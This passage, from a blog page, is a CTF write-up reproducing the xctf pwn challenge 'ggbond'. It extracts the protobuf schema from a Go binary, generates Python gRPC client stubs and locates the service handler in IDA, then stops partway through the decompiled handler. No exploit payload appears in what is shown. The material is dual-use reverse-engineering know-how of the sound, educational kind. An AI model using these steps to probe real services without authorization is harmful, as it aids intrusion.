<!DOCTYPE HTML>
<html>
<head>
  <meta charset="utf-8">
  <meta http-equiv="pragma" content="no-cache">
  <meta http-equiv="cache-control" content="no-cache">
  <meta http-equiv="expires" content="0">
  
  <title>xctf_ggbord复现 | nyyyddddn</title>
  <meta name="author" content="nyyyddddn">
  
  <meta name="description" content="ggbond可以发现主函数是main_main，同时存在大量grpc字段，可以判断出程序使用了grpc框架。和grpc框架开发的程序进行交互，需要提取protobuf，protobuf谷歌开发的数据序列化格式，它通常用于网络通信和数据存储的应用程序之间的结构化数据交换。这个工具让你能够定义交互时消息的数据结构。
程序套了grpc，与程序的交互不再直接通过标准输入，而需要通过定义的 gRPC 服务接口来进行，然后grpc 使用一个叫protobuf的结构去描述怎么和程序交互的，首先需要提取出程序中的protobuf，然后python中有一个叫grpc_tools的库可以通过 protobuf文件生成和程序交互的代码。
github上有一个叫pbtk的项目可以提取出elf的 protobuf结构
使用 pbtk提取 protobuf文件
.&amp;#x2F;pbtk&amp;#x2F;extractors&amp;#x2F;from_binary.py pwn

提取出来的protobuf文件
syntax = &#34;proto3&#34;;

package GGBond;

option go_package = &#34;./;ggbond&#34;;

service GGBondServer &amp;#123;
    rpc Handler(Request) returns (Response);
&amp;#125;

message Request &amp;#123;
    oneof request &amp;#123;
        WhoamiRequest whoami = 100;
        RoleChangeRequest role_change = 101;
        RepeaterRequest repeater = 102;
    &amp;#125;
&amp;#125;

message Response &amp;#123;
    oneof response &amp;#123;
        WhoamiResponse whoami = 200;
        RoleChangeResponse role_change = 201;
        RepeaterResponse repeater = 202;
        ErrorResponse error = 444;
    &amp;#125;
&amp;#125;

message WhoamiRequest &amp;#123;
    
&amp;#125;

message WhoamiResponse &amp;#123;
    string message = 2000;
&amp;#125;

message RoleChangeRequest &amp;#123;
    uint32 role = 1001;
&amp;#125;

message RoleChangeResponse &amp;#123;
    string message = 2001;
&amp;#125;

message RepeaterRequest &amp;#123;
    string message = 1002;
&amp;#125;

message RepeaterResponse &amp;#123;
    string message = 2002;
&amp;#125;

message ErrorResponse &amp;#123;
    string message = 4444;
&amp;#125;



使用grpc_tools 生成和程序交互的函数库的命令
python -m grpc_tools.protoc -I. --python_out&amp;#x3D;. --grpc_python_out&amp;#x3D;. .&amp;#x2F;ggbond.proto"> 
  
  
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">

  <meta property="og:title" content="xctf_ggbord复现"/>
  <meta property="og:site_name" content="nyyyddddn"/>

  
    <meta property="og:image" content=""/>
  

  
    <link rel="alternative" href="/atom.xml" title="nyyyddddn" type="application/atom+xml">
  
  
    <link href="/favicon.png" rel="icon">
  
  
  <link rel="stylesheet" href="/css/bootstrap.min.css" media="screen" type="text/css">
  <link rel="stylesheet" href="/css/font-awesome.css" media="screen" type="text/css">
  <link rel="stylesheet" href="/css/style.css" media="screen" type="text/css">
  <link rel="stylesheet" href="/css/responsive.css" media="screen" type="text/css">
  <link rel="stylesheet" href="/css/highlight.css" media="screen" type="text/css">
  <link rel="stylesheet" href="/css/prism.css" media="screen" type="text/css">
  <link rel="stylesheet" href="/css/google-fonts.css" media="screen" type="text/css">
  <!--[if lt IE 9]><script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script><![endif]-->

  <script src="/js/jquery-2.0.3.min.js"></script>

  <!-- analytics -->
  




<meta name="generator" content="Hexo 6.3.0"></head>

 <body>  
  <nav id="main-nav" class="navbar navbar-inverse navbar-fixed-top" role="navigation">
    <div class="container">
      <button type="button" class="navbar-header navbar-toggle" data-toggle="collapse" data-target=".navbar-collapse">
		<span class="sr-only">Toggle navigation</span>
        <span class="icon-bar"></span>
        <span class="icon-bar"></span>
        <span class="icon-bar"></span>
      </button>
	  <a class="navbar-brand" href="/">nyyyddddn</a>
      <div class="collapse navbar-collapse nav-menu">
		<ul class="nav navbar-nav">
		  
		  <li>
			<a href="/archives" title="All the articles.">
			  <i class=""></i>Archives
			</a>
		  </li>
		  
		  <li>
			<a href="/catergories" title="All the categories.">
			  <i class=""></i>Categories
			</a>
		  </li>
		  
		  <li>
			<a href="/tags" title="All the tags.">
			  <i class=""></i>Tags
			</a>
		  </li>
		  
		  <li>
			<a href="/about" title="About me.">
			  <i class=""></i>About
			</a>
		  </li>
		  
		  <li>
			<a href="/atom.xml" title="Subscribe me.">
			  <i class=""></i>RSS
			</a>
		  </li>
		  
		</ul>
      </div>
    </div> <!-- container -->
</nav>
<div class="clearfix"></div>

  <div class="container">
  	<div class="content">
    	 


	
		<div class="page-header">
			<h1> xctf_ggbord复现</h1>
		</div>
	



<div class="row post">
	<!-- cols -->
	
	<div id="top_meta"></div>
	<div class="col-md-9">
	

	<!-- content -->
	<div class="mypage">		
	  		

	  <h2 id="ggbond"><a href="#ggbond" class="headerlink" title="ggbond"></a>ggbond</h2><p>可以发现主函数是main_main，同时存在大量grpc字段，可以判断出程序使用了grpc框架。和grpc框架开发的程序进行交互，需要提取protobuf，protobuf谷歌开发的数据序列化格式，它通常用于网络通信和数据存储的应用程序之间的结构化数据交换。这个工具让你能够定义交互时消息的数据结构。</p>
<p>程序套了grpc，与程序的交互不再直接通过标准输入，而需要通过定义的 gRPC 服务接口来进行，然后grpc 使用一个叫protobuf的结构去描述怎么和程序交互的，首先需要提取出程序中的protobuf，然后python中有一个叫grpc_tools的库可以通过 protobuf文件生成和程序交互的代码。</p>
<p>github上有一个叫pbtk的项目可以提取出elf的 protobuf结构</p>
<p>使用 pbtk提取 protobuf文件</p>
<pre class="line-numbers language-none"><code class="language-none">.&#x2F;pbtk&#x2F;extractors&#x2F;from_binary.py pwn<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>提取出来的protobuf文件</p>
<pre class="line-numbers language-protobuf" data-language="protobuf"><code class="language-protobuf"><span class="token keyword">syntax</span> <span class="token operator">=</span> <span class="token string">"proto3"</span><span class="token punctuation">;</span>

<span class="token keyword">package</span> GGBond<span class="token punctuation">;</span>

<span class="token keyword">option</span> go_package <span class="token operator">=</span> <span class="token string">"./;ggbond"</span><span class="token punctuation">;</span>

<span class="token keyword">service</span> <span class="token class-name">GGBondServer</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">rpc</span> <span class="token function">Handler</span><span class="token punctuation">(</span><span class="token class-name">Request</span><span class="token punctuation">)</span> <span class="token keyword">returns</span> <span class="token punctuation">(</span><span class="token class-name">Response</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">message</span> <span class="token class-name">Request</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">oneof</span> request <span class="token punctuation">&#123;</span>
        <span class="token positional-class-name class-name">WhoamiRequest</span> whoami <span class="token operator">=</span> <span class="token number">100</span><span class="token punctuation">;</span>
        <span class="token positional-class-name class-name">RoleChangeRequest</span> role_change <span class="token operator">=</span> <span class="token number">101</span><span class="token punctuation">;</span>
        <span class="token positional-class-name class-name">RepeaterRequest</span> repeater <span class="token operator">=</span> <span class="token number">102</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">message</span> <span class="token class-name">Response</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">oneof</span> response <span class="token punctuation">&#123;</span>
        <span class="token positional-class-name class-name">WhoamiResponse</span> whoami <span class="token operator">=</span> <span class="token number">200</span><span class="token punctuation">;</span>
        <span class="token positional-class-name class-name">RoleChangeResponse</span> role_change <span class="token operator">=</span> <span class="token number">201</span><span class="token punctuation">;</span>
        <span class="token positional-class-name class-name">RepeaterResponse</span> repeater <span class="token operator">=</span> <span class="token number">202</span><span class="token punctuation">;</span>
        <span class="token positional-class-name class-name">ErrorResponse</span> error <span class="token operator">=</span> <span class="token number">444</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">message</span> <span class="token class-name">WhoamiRequest</span> <span class="token punctuation">&#123;</span>
    
<span class="token punctuation">&#125;</span>

<span class="token keyword">message</span> <span class="token class-name">WhoamiResponse</span> <span class="token punctuation">&#123;</span>
    <span class="token builtin">string</span> message <span class="token operator">=</span> <span class="token number">2000</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">message</span> <span class="token class-name">RoleChangeRequest</span> <span class="token punctuation">&#123;</span>
    <span class="token builtin">uint32</span> role <span class="token operator">=</span> <span class="token number">1001</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">message</span> <span class="token class-name">RoleChangeResponse</span> <span class="token punctuation">&#123;</span>
    <span class="token builtin">string</span> message <span class="token operator">=</span> <span class="token number">2001</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">message</span> <span class="token class-name">RepeaterRequest</span> <span class="token punctuation">&#123;</span>
    <span class="token builtin">string</span> message <span class="token operator">=</span> <span class="token number">1002</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">message</span> <span class="token class-name">RepeaterResponse</span> <span class="token punctuation">&#123;</span>
    <span class="token builtin">string</span> message <span class="token operator">=</span> <span class="token number">2002</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">message</span> <span class="token class-name">ErrorResponse</span> <span class="token punctuation">&#123;</span>
    <span class="token builtin">string</span> message <span class="token operator">=</span> <span class="token number">4444</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>



<p>使用grpc_tools 生成和程序交互的函数库的命令</p>
<pre class="line-numbers language-none"><code class="language-none">python -m grpc_tools.protoc -I. --python_out&#x3D;. --grpc_python_out&#x3D;. .&#x2F;ggbond.proto<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>可以发现多出来两个文件 ggbond_pb2_grpc.py  ggbond_pb2.py</p>
<p>ggbond_pb2.py</p>
<pre class="line-numbers language-none"><code class="language-none"># -*- coding: utf-8 -*-
# Generated by the protocol buffer compiler.  DO NOT EDIT!
# source: ggbond.proto
# Protobuf Python Version: 5.26.1
&quot;&quot;&quot;Generated protocol buffer code.&quot;&quot;&quot;
from google.protobuf import descriptor as _descriptor
from google.protobuf import descriptor_pool as _descriptor_pool
from google.protobuf import symbol_database as _symbol_database
from google.protobuf.internal import builder as _builder
# @@protoc_insertion_point(imports)

_sym_db &#x3D; _symbol_database.Default()


DESCRIPTOR &#x3D; _descriptor_pool.Default().AddSerializedFile(b&#39;\n\x0cggbond.proto\x12\x06GGBond\&quot;\x9c\x01\n\x07Request\x12\&#39;\n\x06whoami\x18\x64 \x01(\x0b\x32\x15.GGBond.WhoamiRequestH\x00\x12\x30\n\x0brole_change\x18\x65 \x01(\x0b\x32\x19.GGBond.RoleChangeRequestH\x00\x12+\n\x08repeater\x18\x66 \x01(\x0b\x32\x17.GGBond.RepeaterRequestH\x00\x42\t\n\x07request\&quot;\xcd\x01\n\x08Response\x12)\n\x06whoami\x18\xc8\x01 \x01(\x0b\x32\x16.GGBond.WhoamiResponseH\x00\x12\x32\n\x0brole_change\x18\xc9\x01 \x01(\x0b\x32\x1a.GGBond.RoleChangeResponseH\x00\x12-\n\x08repeater\x18\xca\x01 \x01(\x0b\x32\x18.GGBond.RepeaterResponseH\x00\x12\&#39;\n\x05\x65rror\x18\xbc\x03 \x01(\x0b\x32\x15.GGBond.ErrorResponseH\x00\x42\n\n\x08response\&quot;\x0f\n\rWhoamiRequest\&quot;\&quot;\n\x0eWhoamiResponse\x12\x10\n\x07message\x18\xd0\x0f \x01(\t\&quot;\&quot;\n\x11RoleChangeRequest\x12\r\n\x04role\x18\xe9\x07 \x01(\r\&quot;&amp;\n\x12RoleChangeResponse\x12\x10\n\x07message\x18\xd1\x0f \x01(\t\&quot;#\n\x0fRepeaterRequest\x12\x10\n\x07message\x18\xea\x07 \x01(\t\&quot;$\n\x10RepeaterResponse\x12\x10\n\x07message\x18\xd2\x0f \x01(\t\&quot;!\n\rErrorResponse\x12\x10\n\x07message\x18\xdc\&quot; \x01(\t2&lt;\n\x0cGGBondServer\x12,\n\x07Handler\x12\x0f.GGBond.Request\x1a\x10.GGBond.ResponseB\x0bZ\t.&#x2F;;ggbondb\x06proto3&#39;)

_globals &#x3D; globals()
_builder.BuildMessageAndEnumDescriptors(DESCRIPTOR, _globals)
_builder.BuildTopDescriptorsAndMessages(DESCRIPTOR, &#39;ggbond_pb2&#39;, _globals)
if not _descriptor._USE_C_DESCRIPTORS:
  _globals[&#39;DESCRIPTOR&#39;]._loaded_options &#x3D; None
  _globals[&#39;DESCRIPTOR&#39;]._serialized_options &#x3D; b&#39;Z\t.&#x2F;;ggbond&#39;
  _globals[&#39;_REQUEST&#39;]._serialized_start&#x3D;25
  _globals[&#39;_REQUEST&#39;]._serialized_end&#x3D;181
  _globals[&#39;_RESPONSE&#39;]._serialized_start&#x3D;184
  _globals[&#39;_RESPONSE&#39;]._serialized_end&#x3D;389
  _globals[&#39;_WHOAMIREQUEST&#39;]._serialized_start&#x3D;391
  _globals[&#39;_WHOAMIREQUEST&#39;]._serialized_end&#x3D;406
  _globals[&#39;_WHOAMIRESPONSE&#39;]._serialized_start&#x3D;408
  _globals[&#39;_WHOAMIRESPONSE&#39;]._serialized_end&#x3D;442
  _globals[&#39;_ROLECHANGEREQUEST&#39;]._serialized_start&#x3D;444
  _globals[&#39;_ROLECHANGEREQUEST&#39;]._serialized_end&#x3D;478
  _globals[&#39;_ROLECHANGERESPONSE&#39;]._serialized_start&#x3D;480
  _globals[&#39;_ROLECHANGERESPONSE&#39;]._serialized_end&#x3D;518
  _globals[&#39;_REPEATERREQUEST&#39;]._serialized_start&#x3D;520
  _globals[&#39;_REPEATERREQUEST&#39;]._serialized_end&#x3D;555
  _globals[&#39;_REPEATERRESPONSE&#39;]._serialized_start&#x3D;557
  _globals[&#39;_REPEATERRESPONSE&#39;]._serialized_end&#x3D;593
  _globals[&#39;_ERRORRESPONSE&#39;]._serialized_start&#x3D;595
  _globals[&#39;_ERRORRESPONSE&#39;]._serialized_end&#x3D;628
  _globals[&#39;_GGBONDSERVER&#39;]._serialized_start&#x3D;630
  _globals[&#39;_GGBONDSERVER&#39;]._serialized_end&#x3D;690
# @@protoc_insertion_point(module_scope)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p> ggbond_pb2_grpc.py</p>
<pre class="line-numbers language-none"><code class="language-none"># Generated by the gRPC Python protocol compiler plugin. DO NOT EDIT!
&quot;&quot;&quot;Client and server classes corresponding to protobuf-defined services.&quot;&quot;&quot;
import grpc
import warnings

import ggbond_pb2 as ggbond__pb2

GRPC_GENERATED_VERSION &#x3D; &#39;1.64.0&#39;
GRPC_VERSION &#x3D; grpc.__version__
EXPECTED_ERROR_RELEASE &#x3D; &#39;1.65.0&#39;
SCHEDULED_RELEASE_DATE &#x3D; &#39;June 25, 2024&#39;
_version_not_supported &#x3D; False

try:
    from grpc._utilities import first_version_is_lower
    _version_not_supported &#x3D; first_version_is_lower(GRPC_VERSION, GRPC_GENERATED_VERSION)
except ImportError:
    _version_not_supported &#x3D; True

if _version_not_supported:
    warnings.warn(
        f&#39;The grpc package installed is at version &#123;GRPC_VERSION&#125;,&#39;
        + f&#39; but the generated code in ggbond_pb2_grpc.py depends on&#39;
        + f&#39; grpcio&gt;&#x3D;&#123;GRPC_GENERATED_VERSION&#125;.&#39;
        + f&#39; Please upgrade your grpc module to grpcio&gt;&#x3D;&#123;GRPC_GENERATED_VERSION&#125;&#39;
        + f&#39; or downgrade your generated code using grpcio-tools&lt;&#x3D;&#123;GRPC_VERSION&#125;.&#39;
        + f&#39; This warning will become an error in &#123;EXPECTED_ERROR_RELEASE&#125;,&#39;
        + f&#39; scheduled for release on &#123;SCHEDULED_RELEASE_DATE&#125;.&#39;,
        RuntimeWarning
    )


class GGBondServerStub(object):
    &quot;&quot;&quot;Missing associated documentation comment in .proto file.&quot;&quot;&quot;

    def __init__(self, channel):
        &quot;&quot;&quot;Constructor.

        Args:
            channel: A grpc.Channel.
        &quot;&quot;&quot;
        self.Handler &#x3D; channel.unary_unary(
                &#39;&#x2F;GGBond.GGBondServer&#x2F;Handler&#39;,
                request_serializer&#x3D;ggbond__pb2.Request.SerializeToString,
                response_deserializer&#x3D;ggbond__pb2.Response.FromString,
                _registered_method&#x3D;True)


class GGBondServerServicer(object):
    &quot;&quot;&quot;Missing associated documentation comment in .proto file.&quot;&quot;&quot;

    def Handler(self, request, context):
        &quot;&quot;&quot;Missing associated documentation comment in .proto file.&quot;&quot;&quot;
        context.set_code(grpc.StatusCode.UNIMPLEMENTED)
        context.set_details(&#39;Method not implemented!&#39;)
        raise NotImplementedError(&#39;Method not implemented!&#39;)


def add_GGBondServerServicer_to_server(servicer, server):
    rpc_method_handlers &#x3D; &#123;
            &#39;Handler&#39;: grpc.unary_unary_rpc_method_handler(
                    servicer.Handler,
                    request_deserializer&#x3D;ggbond__pb2.Request.FromString,
                    response_serializer&#x3D;ggbond__pb2.Response.SerializeToString,
            ),
    &#125;
    generic_handler &#x3D; grpc.method_handlers_generic_handler(
            &#39;GGBond.GGBondServer&#39;, rpc_method_handlers)
    server.add_generic_rpc_handlers((generic_handler,))
    server.add_registered_method_handlers(&#39;GGBond.GGBondServer&#39;, rpc_method_handlers)


 # This class is part of an EXPERIMENTAL API.
class GGBondServer(object):
    &quot;&quot;&quot;Missing associated documentation comment in .proto file.&quot;&quot;&quot;

    @staticmethod
    def Handler(request,
            target,
            options&#x3D;(),
            channel_credentials&#x3D;None,
            call_credentials&#x3D;None,
            insecure&#x3D;False,
            compression&#x3D;None,
            wait_for_ready&#x3D;None,
            timeout&#x3D;None,
            metadata&#x3D;None):
        return grpc.experimental.unary_unary(
            request,
            target,
            &#39;&#x2F;GGBond.GGBondServer&#x2F;Handler&#39;,
            ggbond__pb2.Request.SerializeToString,
            ggbond__pb2.Response.FromString,
            options,
            channel_credentials,
            insecure,
            call_credentials,
            compression,
            wait_for_ready,
            timeout,
            metadata,
            _registered_method&#x3D;True)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>其中ggbond_pb2.py 定义了交互的时候消息的数据结构</p>
<p>ggbond_pb2_grpc.py 定义了交互的时候 接收 处理 响应请求的代码</p>
<p>通过grpc_tools 生成ggbond_pb2_grpc.py ggbond_pb2.py这两个文件后，就要弄清楚这两个库该怎么用，还有交互的板子该怎么写的问题</p>
<p>protobuf中定义了一个叫 GGBondServer的 rpc服务，其中有三个 request请求</p>
<pre class="line-numbers language-none"><code class="language-none">syntax &#x3D; &quot;proto3&quot;;

package GGBond;

option go_package &#x3D; &quot;.&#x2F;;ggbond&quot;;

service GGBondServer &#123;
    rpc Handler(Request) returns (Response);
&#125;

message Request &#123;
    oneof request &#123;
        WhoamiRequest whoami &#x3D; 100;
        RoleChangeRequest role_change &#x3D; 101;
        RepeaterRequest repeater &#x3D; 102;
    &#125;
&#125;

message Response &#123;
    oneof response &#123;
        WhoamiResponse whoami &#x3D; 200;
        RoleChangeResponse role_change &#x3D; 201;
        RepeaterResponse repeater &#x3D; 202;
        ErrorResponse error &#x3D; 444;
    &#125;
&#125;

message WhoamiRequest &#123;
    
&#125;

message WhoamiResponse &#123;
    string message &#x3D; 2000;
&#125;

message RoleChangeRequest &#123;
    uint32 role &#x3D; 1001;
&#125;

message RoleChangeResponse &#123;
    string message &#x3D; 2001;
&#125;

message RepeaterRequest &#123;
    string message &#x3D; 1002;
&#125;

message RepeaterResponse &#123;
    string message &#x3D; 2002;
&#125;

message ErrorResponse &#123;
    string message &#x3D; 4444;
&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>根据gpt给的样例，交互的板子是这样的</p>
<pre class="line-numbers language-none"><code class="language-none">import grpc

import ggbond_pb2
import ggbond_pb2_grpc


def whoami(chan):
    stub&#x3D;ggbond_pb2_grpc.GGBondServerStub(chan)
    respond&#x3D;stub.Handler(ggbond_pb2.Request(whoami&#x3D;ggbond_pb2.WhoamiRequest()))
    return respond

def role_change(chan,role):
    stub&#x3D;ggbond_pb2_grpc.GGBondServerStub(chan)
    respond&#x3D;stub.Handler(ggbond_pb2.Request(role_change&#x3D;ggbond_pb2.RoleChangeRequest(role&#x3D;role)))
    return respond

def repeater(chan,message):
    stub&#x3D;ggbond_pb2_grpc.GGBondServerStub(chan)
    respond&#x3D;stub.Handler(ggbond_pb2.Request(repeater&#x3D;ggbond_pb2.RepeaterRequest(message&#x3D;message)))
    return respond<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>



<p>之后就是找protobuf中定义的三个request对应的handler代码在哪里，这三个handler的代码块 就是程序的 “主逻辑”</p>
<p>在main_main函数中，有一个google_golang_org_grpc__ptr_Server_RegisterService函数，第二个参数是一个描述服务的结构体ServiceDesc，其中MethodDest结构体中有一个handler指针，指向handler函数</p>
<pre class="line-numbers language-none"><code class="language-none">v11.data &#x3D; &amp;unk_C94D10;
google_golang_org_grpc__ptr_Server_RegisterService(v8, &amp;stru_C59860, v11);
v6 &#x3D; (*(__int64 (__golang **)(__int64))(v9[0] + 32LL))(3LL);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p>结构体的定义</p>
<pre class="line-numbers language-none"><code class="language-none">type ServiceDesc struct &#123;
    ServiceName string
    HandlerType interface&#123;&#125;
    Methods     []MethodDesc
    Streams     []StreamDesc
&#125;

type MethodDesc struct &#123;
    MethodName string
    Handler    func(srv interface&#123;&#125;, ctx context.Context, dec func(interface&#123;&#125;) error, interceptor UnaryServerInterceptor) (interface&#123;&#125;, error)
&#125;

type StreamDesc struct &#123;
    StreamName string
    Handler    func(srv interface&#123;&#125;, stream ServerStream) error
    ServerStreams bool
    ClientStreams bool
&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>在ida的结构是这样的</p>
<pre class="line-numbers language-none"><code class="language-none">.data:0000000000C59860 ; grpc_ServiceDesc stru_C59860
.data:0000000000C59860 stru_C59860     dq offset aGgbondGgbondse_0; ServiceName.ptr
.data:0000000000C59860                                         ; DATA XREF: main_main+121↑o
.data:0000000000C59868                 dq 13h                  ; ServiceName.len ; &quot;GGBond.GGBondServer&quot;
.data:0000000000C59870                 dq offset RTYPE__ptr_ggbond_GGBondServerServer; HandlerType.tab
.data:0000000000C59878                 dq 0                    ; HandlerType.data
.data:0000000000C59880                 dq offset off_C525C0    ; Methods.ptr
.data:0000000000C59888                 dq 1                    ; Methods.len
.data:0000000000C59890                 dq 1                    ; Methods.cap
.data:0000000000C59898                 dq offset byte_C94A20   ; Streams.ptr
.data:0000000000C598A0                 dq 0                    ; Streams.len
.data:0000000000C598A8                 dq 0                    ; Streams.cap
.data:0000000000C598B0                 dq offset RTYPE_string  ; Metadata.tab
.data:0000000000C598B8                 dq offset off_C51630    ; Metadata.data<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>从methods.ptr这个指针跟过去 0x90BD28h 这个就是handler函数的地址了</p>
<pre class="line-numbers language-none"><code class="language-none">.data:0000000000C525C0 off_C525C0      dq offset aFlagsLenDLocks+222h
.data:0000000000C525C0                                         ; DATA XREF: .data:stru_C59860↓o
.data:0000000000C525C0                                         ; &quot;HandlerHanunooHstrok;ILLEGALIM UsedIO w&quot;...
.data:0000000000C525C8                 db    7
.data:0000000000C525C9                 db    0
.data:0000000000C525CA                 db    0
.data:0000000000C525CB                 db    0
.data:0000000000C525CC                 db    0
.data:0000000000C525CD                 db    0
.data:0000000000C525CE                 db    0
.data:0000000000C525CF                 db    0
.data:0000000000C525D0                 dd 90BD28h
.data:0000000000C525D4                 align 20h<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>handler函数的逻辑</p>
<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token comment">// main/ggbond._GGBondServer_Handler_Handler</span>
RTYPE <span class="token operator">*</span>__golang <span class="token function">main_ggbond__GGBondServer_Handler_Handler</span><span class="token punctuation">(</span>
        <span class="token keyword">void</span> <span class="token operator">*</span>a1<span class="token punctuation">,</span>
        <span class="token keyword">void</span> <span class="token operator">*</span>a2<span class="token punctuation">,</span>
        __int64 a3<span class="token punctuation">,</span>
        __int64 a4<span class="token punctuation">,</span>
        <span class="token function">__int64</span> <span class="token punctuation">(</span>__golang <span class="token operator">*</span><span class="token operator">*</span>a5<span class="token punctuation">)</span><span class="token punctuation">(</span>RTYPE <span class="token operator">*</span><span class="token punctuation">,</span> ggbond_Request <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
        <span class="token function">__int64</span> <span class="token punctuation">(</span>__golang <span class="token operator">*</span><span class="token operator">*</span>a6<span class="token punctuation">)</span><span class="token punctuation">(</span>_QWORD<span class="token punctuation">,</span> _QWORD<span class="token punctuation">,</span> RTYPE <span class="token operator">*</span><span class="token punctuation">,</span> ggbond_Request <span class="token operator">*</span><span class="token punctuation">,</span> grpc_UnaryServerInfo <span class="token operator">*</span><span class="token punctuation">,</span> _QWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
  __int64 v6<span class="token punctuation">;</span> <span class="token comment">// r14</span>
  <span class="token keyword">int</span> v7<span class="token punctuation">;</span> <span class="token comment">// r8d</span>
  <span class="token keyword">int</span> v8<span class="token punctuation">;</span> <span class="token comment">// r9d</span>
  <span class="token keyword">int</span> v9<span class="token punctuation">;</span> <span class="token comment">// r10d</span>
  <span class="token keyword">int</span> v10<span class="token punctuation">;</span> <span class="token comment">// r11d</span>
  <span class="token keyword">char</span> <span class="token operator">*</span>v11<span class="token punctuation">;</span> <span class="token comment">// rcx</span>
  __int64 i<span class="token punctuation">;</span> <span class="token comment">// rax</span>
  grpc_UnaryServerInfo <span class="token operator">*</span>p_grpc_UnaryServerInfo<span class="token punctuation">;</span> <span class="token comment">// rax</span>
  _QWORD <span class="token operator">*</span>v14<span class="token punctuation">;</span> <span class="token comment">// rax</span>
  __int64 v15<span class="token punctuation">;</span> <span class="token comment">// rdx</span>
  __int64 v16<span class="token punctuation">;</span> <span class="token comment">// r8</span>
  <span class="token keyword">void</span> <span class="token operator">*</span>v17<span class="token punctuation">;</span> <span class="token comment">// rcx</span>
  __int64 v19<span class="token punctuation">;</span> <span class="token comment">// rax</span>
  <span class="token keyword">char</span> v20<span class="token punctuation">[</span><span class="token number">80</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [rsp+40h] [rbp-338h] BYREF</span>
  <span class="token keyword">char</span> v21<span class="token punctuation">;</span> <span class="token comment">// [rsp+90h] [rbp-2E8h] BYREF</span>
  grpc_UnaryServerInfo <span class="token operator">*</span>v22<span class="token punctuation">;</span> <span class="token comment">// [rsp+340h] [rbp-38h]</span>
  ggbond_Request <span class="token operator">*</span>p_ggbond_Request<span class="token punctuation">;</span> <span class="token comment">// [rsp+348h] [rbp-30h]</span>
  <span class="token keyword">void</span> <span class="token operator">*</span>v24<span class="token punctuation">;</span> <span class="token comment">// [rsp+350h] [rbp-28h]</span>
  <span class="token keyword">char</span> <span class="token operator">*</span>v25<span class="token punctuation">;</span> <span class="token comment">// [rsp+358h] [rbp-20h]</span>
